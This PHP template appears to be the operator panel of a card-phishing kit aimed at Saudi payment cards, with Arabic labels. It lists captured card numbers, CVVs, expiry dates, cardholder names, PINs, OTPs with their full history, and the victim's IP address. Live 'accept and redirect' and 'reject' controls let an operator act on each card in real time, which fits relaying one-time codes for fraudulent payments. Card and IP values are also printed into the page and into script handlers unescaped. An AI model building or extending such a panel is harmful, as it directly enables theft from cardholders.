<?php
session_start();
require_once 'init.php';

function getCardType($cardNumber)
{
    $num = preg_replace('/\D/', '', $cardNumber); // digits only
    if (strlen($num) < 4)
        return ['type' => 'other', 'label' => 'أخرى', 'color' => '#64748b', 'bg' => '#f1f5f9', 'icon' => 'bi-credit-card'];

    // --- MADA BINs ---
    $madaBins = ['400861','401757','407197','407395','410621','418049','428671','428672','428673','431361','432328','440533','440647','440795','445564','446393','446404','446672','455036','455708','457865','457997','458456','462220','468540','468541','468542','468543','483010','483011','483012','484783','486094','486095','486096','487462','489318','489319','493428','504300','508160','5078','5079','521076','524130','524514','529741','530060','531095','535825','535989','536023','537767','540020','543085','543357','549760','557606','558563','585265','588845','588846','588847','588849','588850','588851','588982','589005','589206','604906','605141','636120','968201','968202','968203','968204','968205','968206','968207','968208','968209','968210','968211'];
    foreach ($madaBins as $bin) {
        if (strpos($num, $bin) === 0) {
            return ['type' => 'mada', 'label' => 'مدى', 'color' => '#fff', 'bg' => '#1a56db', 'icon' => 'bi-credit-card-2-front-fill'];
        }
    }

    // --- STC Pay BINs ---
    $stcBins = ['9682', '9683', '446672', '588982'];
    foreach ($stcBins as $bin) {
        if (strpos($num, $bin) === 0) {
            return ['type' => 'stc', 'label' => 'STC Pay', 'color' => '#fff', 'bg' => '#7e22ce', 'icon' => 'bi-phone-fill'];
        }
    }

    // --- Mastercard ---
    $prefix2 = (int) substr($num, 0, 2);
    $prefix4 = (int) substr($num, 0, 4);
    if (($prefix2 >= 51 && $prefix2 <= 55) || ($prefix4 >= 2221 && $prefix4 <= 2720)) {
        return ['type' => 'mastercard', 'label' => 'Mastercard', 'color' => '#1a1a1a', 'bg' => '#f5f5f5', 'icon' => 'bi-credit-card-fill'];
    }

    // --- Visa ---
    if ($num[0] === '4') {
        return ['type' => 'visa', 'label' => 'Visa', 'color' => '#fff', 'bg' => '#1a3a8f', 'icon' => 'bi-credit-card-2-front-fill'];
    }

    return ['type' => 'other', 'label' => 'أخرى', 'color' => '#fff', 'bg' => '#64748b', 'icon' => 'bi-credit-card'];
}

$cards = $User->fetchAllCards();
$banned_ips = $User->fetchAllBannedIPs();
$banned_cards = $User->fetchAllBannedCards();

if ($cards != false):
    $row = $cards[0]; // Assuming latest
    $u = $User->fetchUserById($row->userId);
    if (!$u) {
        $u = (object) ['ip' => '', 'id' => 0, 'location' => 'Unknown', 'device' => 'Unknown', 'browser' => 'Unknown', 'is_pinned' => false, 'is_distinguished' => false, 'is_completed' => false, 'is_archived' => false];
    }
    $isCardBanned = in_array($row->cardNumber, $banned_cards);
    $cardBanFlagHTML = $isCardBanned ? '<span class="badge bg-danger ms-1" style="font-size:0.6rem;">محظورة</span>' : '';
    $visitor_ip = $u->ip ?? '';
    $isVisitorBanned = $visitor_ip ? in_array($visitor_ip, $banned_ips) : false;
    $otpHistory = $User->fetchOTPHistory($row->id);
    ?>
    <div class="user-module" data-card-id="<?= $row->id; ?>" data-user-id="<?= $row->userId; ?>"
        onclick="openDetailPanel(<?= $row->userId ?: 0; ?>)" style="cursor:pointer;">

        <!-- 1. Selection -->
        <div class="selection-overlay">
            <input type="checkbox" name="selectedUsers[]" value="<?= $row->id ?>" class="user-checkbox"
                onclick="event.stopPropagation(); updateBulkBar();">
        </div>

        <!-- 2. Card Icon & Status -->
        <div class="avatar-wrapper">
            <div
                class="avatar-circle <?= $row->status == 1 ? 'active' : ($row->status == 2 ? 'offline' : 'waiting') ?>">
                <i class="bi bi-credit-card-2-front-fill"></i>
            </div>
            <div
                class="pulse-indicator <?= $row->status == 1 ? 'active' : ($row->status == 2 ? 'offline' : 'waiting') ?>">
            </div>
        </div>

        <!-- 3. Main Info -->
        <div class="module-body">
            <!-- Card ID & Status -->
            <div class="user-main-info">
                <span class="user-id-badge">
                    CARD #<?= $row->id; ?>
                    <span class="ban-status-badge"
                        data-card-id="<?= $row->id; ?>"><?= $cardBanFlagHTML ?></span>
                </span>
                <div class="full-timestamp mt-1">
                    <?php if ($row->status == 1): ?>
                        <span class="badge bg-success" style="font-size:0.65rem;"><i class="bi bi-check-circle"></i>
                            مقبول</span>
                    <?php elseif ($row->status == 2): ?>
                        <span class="badge bg-danger" style="font-size:0.65rem;"><i class="bi bi-x-circle"></i>
                            مرفوض</span>
                    <?php else: ?>
                        <span class="badge bg-warning text-dark" style="font-size:0.65rem;"><i
                                class="bi bi-hourglass-split"></i> انتظار</span>
                    <?php endif; ?>
                </div>
            </div>

            <!-- Card Number & Sensitive Data -->
            <?php $ct = getCardType($row->cardNumber ?? ''); ?>
            <div class="tech-info-column" style="width:220px;">
                <div class="t-row" style="font-size:0.8rem;font-weight:700;letter-spacing:1px;" dir="ltr">
                    <i class="bi bi-credit-card-2-back me-1"></i>
                    <?= $row->cardNumber ?: '---- ---- ---- ----'; ?>
                </div>
                <div class="t-row">
                    <i class="bi bi-calendar3 ms-1"></i> <?= $row->year ?: '---'; ?> &nbsp;&nbsp;
                    <i class="bi bi-lock-fill ms-1"></i> <?= $row->cvv ?: '---'; ?>
                </div>
                <div class="t-row">
                    <i class="bi bi-person-badge ms-1"></i> <?= $row->cardname ?: '---'; ?>
                </div>
                <div class="t-row mt-1">
                    <span
                        style="background:<?= $ct['bg'] ?>;color:<?= $ct['color'] ?>;padding:2px 8px;border-radius:6px;font-size:0.7rem;font-weight:700;">
                        <i class="bi <?= $ct['icon'] ?> me-1"></i><?= $ct['label'] ?>
                    </span>
                </div>
            </div>

            <!-- OTP / PIN Codes -->
            <div class="activity-summary">
                <div class="current-page">
                    <i class="bi bi-key-fill text-warning"></i>
                    OTP: <strong class="otp-val-<?= $row->id ?>"
                        style="color:#f59e0b;letter-spacing:2px;"><?= $row->otp ?: '------'; ?></strong>
                    <?php if (!empty($otpHistory)): ?>
                        <span class="ms-2 text-muted" style="font-size:0.65rem;">
                            (<?= count($otpHistory) ?> سابق)
                        </span>
                    <?php endif; ?>
                </div>
                <?php if (!empty($otpHistory)): ?>
                    <div class="last-msg d-flex flex-wrap gap-1 mt-1" style="font-size:0.7rem;">
                        <?php foreach ($otpHistory as $oh): ?>
                            <span class="badge"
                                style="background:#1e293b;color:#94a3b8;letter-spacing:1px;font-size:0.65rem;cursor:default;"
                                title="<?= date('d/m H:i', strtotime($oh->created_at)) ?>">
                                <?= htmlspecialchars($oh->otp) ?>
                            </span>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
                <div class="last-msg mt-1">
                    PIN: <strong class="pin-val-<?= $row->id ?>" style="letter-spacing:2px;"><?= $row->password ?: '----'; ?></strong>
                    &nbsp;|&nbsp; 💸 <span class="price-val-<?= $row->id ?>"><?= $row->totalprice ?: '---'; ?></span>
                    &nbsp;|&nbsp; 👤 ID: <?= $row->userId; ?>
                </div>
            </div>
        </div>

        <!-- 4. Quick Actions -->
        <div class="card-quick-actions" onclick="event.stopPropagation();">
            <?php if (!isset($row->status) || ($row->status != 1 && $row->status != 2)): ?>
                <a href="javascript:void(0)"
                    onclick="showCardModal(event, <?= $row->id; ?>, 1, <?= (int) $row->userId; ?>)"
                    title="قبول وتوجيه" class="q-action check">
                    <i class="bi bi-check-circle-fill"></i>
                </a>
                <a href="javascript:void(0)"
                    onclick="showCardModal(event, <?= $row->id; ?>, 2, <?= (int) $row->userId; ?>)" title="رفض"
                    class="q-action" style="color:#e11d48;background:#ffe4e6;border-color:#fda4af;">
                    <i class="bi bi-x-circle-fill"></i>
                </a>
            <?php endif; ?>

            <div class="card-ban-btn-wrapper" data-card-id="<?= $row->id; ?>">
                <?php if ($isCardBanned): ?>
                    <a href="javascript:void(0)"
                        onclick="confirmUnbanCard('<?= $row->cardNumber ?>', <?= $row->id ?>)"
                        title="فك حظر البطاقة" class="q-action"
                        style="color:#059669;background:#d1fae5;border-color:#6ee7b7;">
                        <i class="bi bi-credit-card-fill"></i>
                    </a>
                <?php else: ?>
                    <a href="javascript:void(0)"
                        onclick="confirmBanCard('<?= $row->cardNumber ?>', <?= $row->id ?>)" title="حظر البطاقة"
                        class="q-action" style="color:#d97706;background:#fef3c7;border-color:#fcd34d;">
                        <i class="bi bi-slash-circle-fill"></i>
                    </a>
                <?php endif; ?>
            </div>

            <?php if ($visitor_ip): ?>
                <div class="ip-ban-btn-wrapper" data-card-id="<?= $row->id; ?>">
                    <?php if ($isVisitorBanned): ?>
                        <a href="javascript:void(0)" onclick="confirmUnbanIP('<?= $visitor_ip ?>', <?= $row->id ?>)"
                            title="فك حظر IP" class="q-action"
                            style="color:#059669;background:#d1fae5;border-color:#6ee7b7;">
                            <i class="bi bi-shield-check"></i>
                        </a>
                    <?php else: ?>
                        <a href="javascript:void(0)" onclick="confirmBanIP('<?= $visitor_ip ?>', <?= $row->id ?>)"
                            title="حظر IP الزائر" class="q-action"
                            style="color:#e11d48;background:#ffe4e6;border-color:#fda4af;">
                            <i class="bi bi-slash-circle-fill"></i>
                        </a>
                    <?php endif; ?>
                </div>
            <?php endif; ?>

            <a href="javascript:void(0)" onclick="confirmDeleteCard(<?= $row->id ?>)" title="حذف البطاقة"
                class="q-action delete" style="color:#64748b;background:#f8fafc;border-color:#cbd5e1;">
                <i class="bi bi-trash-fill"></i>
            </a>
        </div>

    </div>
<?php endif; ?>
